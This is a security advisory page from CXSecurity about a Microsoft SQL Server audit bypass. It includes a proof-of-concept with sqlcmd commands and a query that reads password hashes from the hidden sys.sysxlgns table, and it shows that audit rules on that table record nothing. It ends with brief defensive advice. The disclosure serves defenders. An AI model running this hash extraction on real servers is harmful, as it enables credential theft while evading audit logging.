---
title: Microsoft SQL Server 2014 / 2016 / 2017 / 2019 / 2022 Audit Logging Failure
url: https://cxsecurity.com/issue/WLB-2023030043
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-20
fetch_date: 2025-10-04T10:04:35.226541
---

# Microsoft SQL Server 2014 / 2016 / 2017 / 2019 / 2022 Audit Logging Failure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft SQL Server 2014 / 2016 / 2017 / 2019 / 2022 Audit Logging Failure** **2023.03.19**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Title: Microsoft SQL Server Password Hash Exposure
Product: Database
Manufacturer: Microsoft
Affected Version(s): 2012-2022
Risk Level: Medium
CVE Reference: N/A
Author of Advisory: Emad Al-Mousa
Overview:
SQL Server is a popular database system, and database systems are a vital backbone in IT infrastructure as different types of systems and applications will require back-end data-store (databsae system). Moreover, Password hashes for Local database accounts are restricted in terms of permission access and only system admins/ DBA's can access them. of course, attackers will attempt to access them to crack the hashes and access the database system for data exfiltration.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
The following exploit assumes attacker escalated his permission as admin, and he/she will be able extract the password hashes even though an audit is in-place. So, its an audit by pass vulnerability.
currently, SQL Server password hashes are stored in two tables:
sys.sql\_logins ----> visible table and auditing can be configured against it
sys.sysxlgns -----> invisible table and requires special access mode and audit rule is not functional !
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
I will simulate a way to extract password hashes in a stealthy way (auditing will not capture it), in the following PoC the account is called dodo:
Accessing windows server as administrator, open CMD session using the following command:
sqlcmd -S localhost\MSSQL2019 -A -E
USE [master]
GO
select name,pwdhash from sys.sysxlgns where name='dodo';
GO
The password hashes for account “dodo” will be displayed.
Let us create an audit rule using this method to capture “select” statements executed against sys.sysxlgns :
I will create a server-level audit to push audit logs as “binary file”:
USE [master]
GO
CREATE SERVER AUDIT [Audit-2020-SYSTEM-TABLE]
TO FILE
( FILEPATH = N’D:\mssq\_audit\’
,MAXSIZE = 0 MB
,MAX\_ROLLOVER\_FILES = 2147483647
,RESERVE\_DISK\_SPACE = OFF
)
WITH
( QUEUE\_DELAY = 1000
,ON\_FAILURE = CONTINUE
,AUDIT\_GUID = ‘0333dfad-260b-45a4-8302-d7eb94c14cdc’
)
ALTER SERVER AUDIT [Audit-2020-SYSTEM-TABLE] WITH (STATE = ON)
GO
Then, I will define a database level audit under “MASTER” database to audit SELECT statement by any user/account against the system table sys.sysxlgns as follows:
sqlcmd -S localhost\MSSQL2019 -A -E
USE [master]
GO
CREATE DATABASE AUDIT SPECIFICATION [audit-systemtable]
FOR SERVER AUDIT [Audit-2020-SYSTEM-TABLE]
ADD (SELECT ON OBJECT::[sys].[sysxlgns] BY [public])
WITH (STATE = ON)
GO
The audit specification will be successfully created and can be visibly seen in SQL Server management studio.
Now you attempt to execute select statement again:
sqlcmd -S localhost\MSSQL2019 -A -E
USE [master]
GO
select name,pwdhash from sys.sysxlgns where name='dodo';
GO
- checking audit logs.....nothing is recorded !
Conclustion:
Super users and admin accounts must be monitored/audited for real-time monitoring for threat detection, and for future forensic analysis !
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
- Defensive Techniques:
configure Operating System Security auditing and Monitoring.
Network Segmentation and Firewall.
pro-actively patch your systems and database systems.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://databasesecurityninja.wordpress.com/2020/06/02/extract-sql-server-database-password-hashes-without-a-trace/
https://learn.microsoft.com/en-us/sql/relational-databases/system-tables/system-base-tables?view=sql-server-ver16

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030043)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top